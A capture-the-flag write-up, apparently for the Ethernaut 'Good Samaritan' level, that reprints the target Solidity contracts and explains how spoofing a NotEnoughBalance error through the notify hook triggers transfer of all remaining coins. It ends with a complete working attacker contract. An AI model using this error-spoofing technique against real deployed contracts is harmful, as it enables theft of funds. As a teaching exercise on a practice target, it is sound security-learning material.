```solidity
// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "openzeppelin-contracts-08/utils/Address.sol";

contract GoodSamaritan {
    Wallet public wallet;
    Coin public coin;

    constructor() {
        wallet = new Wallet();
        coin = new Coin(address(wallet));

        wallet.setCoin(coin);
    }

    function requestDonation() external returns(bool enoughBalance){
        // donate 10 coins to requester
        try wallet.donate10(msg.sender) {
            return true;
        } catch (bytes memory err) {
            if (keccak256(abi.encodeWithSignature("NotEnoughBalance()")) == keccak256(err)) {
                // send the coins left
                wallet.transferRemainder(msg.sender);
                return false;
            }
        }
    }
}

contract Coin {
    using Address for address;

    mapping(address => uint256) public balances;

    error InsufficientBalance(uint256 current, uint256 required);

    constructor(address wallet_) {
        // one million coins for Good Samaritan initially
        balances[wallet_] = 10**6;
    }

    function transfer(address dest_, uint256 amount_) external {
        uint256 currentBalance = balances[msg.sender];

        // transfer only occurs if balance is enough
        if(amount_ <= currentBalance) {
            balances[msg.sender] -= amount_;
            balances[dest_] += amount_;

            if(dest_.isContract()) {
                // notify contract
                INotifyable(dest_).notify(amount_);
            }
        } else {
            revert InsufficientBalance(currentBalance, amount_);
        }
    }
}

contract Wallet {
    // The owner of the wallet instance
    address public owner;

    Coin public coin;

    error OnlyOwner();
    error NotEnoughBalance();

    modifier onlyOwner() {
        if(msg.sender != owner) {
            revert OnlyOwner();
        }
        _;
    }

    constructor() {
        owner = msg.sender;
    }

    function donate10(address dest_) external onlyOwner {
        // check balance left
        if (coin.balances(address(this)) < 10) {
            revert NotEnoughBalance();
        } else {
            // donate 10 coins
            coin.transfer(dest_, 10);
        }
    }

    function transferRemainder(address dest_) external onlyOwner {
        // transfer balance left
        coin.transfer(dest_, coin.balances(address(this)));
    }

    function setCoin(Coin coin_) external onlyOwner {
        coin = coin_;
    }
}

interface INotifyable {
    function notify(uint256 amount) external;
}
```

We are asked to deplete the coins of a Good Samaritan contract. What makes it a good samaritan? Well, it has tons of coins and is willing to donate them, only 10 at a time though. To deplete all 1 million coins of the contract, we would have to take more than 10 at a time.

Thankfully, the author of this level literally gaves us the clue in a comment, under `requestDonation` function at the comment that says: `send the coins left`. Looking at this function, it is a try-catch clause that handles an exception thrown during `wallet.donate10(msg.sender)`. Specifically, if the exception is due to error `NotEnoughBalance();` then it will send all the remaining coins.

How could `donate10` throw an exception? Apparently, it does throw `NotEnoughBalance();` only when there is not enough balance :). However, that is not where the function call ends, it also goes to `coin.transfer`.

Under `coin.transfer` we finally see something that touches our end: if the transfer happens and it is to a contract account, then `notify(uint256 amount)` function is called there to basically let that contract know about this transfer.

Such things are called **hooks**, allowing contracts to run code before / after / during an event, provided that they support the hook function. You can find more about them in [OpenZeppelin docs](https://docs.openzeppelin.com/contracts/3.x/extending-contracts#rules_of_hooks) too.

Looking back, we are supposed to throw `NotEnoughBalance();` during the transfer, and we may very well do that within our `notify` handler. There is a catch though: if you simply do that it will also revert the `transferRemainder` call too. So we can just check if the `amount` is 10, and revert in that case only. Our resulting attacker contract is as follows:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// interface to call target function
interface IGoodSamaritan {
  function requestDonation() external returns (bool enoughBalance);
}

contract Attack {
  // error signature will be taken from here
  error NotEnoughBalance();

  // entry point for our attack, simply requests a donation
  function pwn(address _addr) external {
     IGoodSamaritan(_addr).requestDonation();
  }

  // notify is called when this contract receives coins
  function notify(uint256 amount) external pure {
    // only revert on 10 coins
    if (amount == 10) {
        revert NotEnoughBalance();
    }
  }
}
```
